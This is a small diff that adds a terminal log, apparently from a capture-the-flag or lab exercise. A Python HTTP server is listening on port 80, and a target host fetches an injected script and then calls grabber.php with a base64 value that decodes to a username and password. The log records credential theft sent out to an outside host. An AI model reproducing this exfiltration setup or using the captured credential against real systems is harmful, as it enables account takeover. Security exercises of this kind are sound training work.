@@ -1,0 +1,7 @@
+python -m SimpleHTTPServer 80                                                   [0/12179]
+Serving HTTP on 0.0.0.0 port 80 ...                                                                               
+                            
+
+172.31.3.7 - - [18/Jul/2020 05:10:01] "GET /test.js HTTP/1.1" 200 -
+172.31.3.7 - - [18/Jul/2020 05:10:01] code 404, message File not found
+172.31.3.7 - - [18/Jul/2020 05:10:01] "GET /grabber.php?c=ZXJsaWNoOmlfTDB2MyQkJA== HTTP/1.1" 404 -
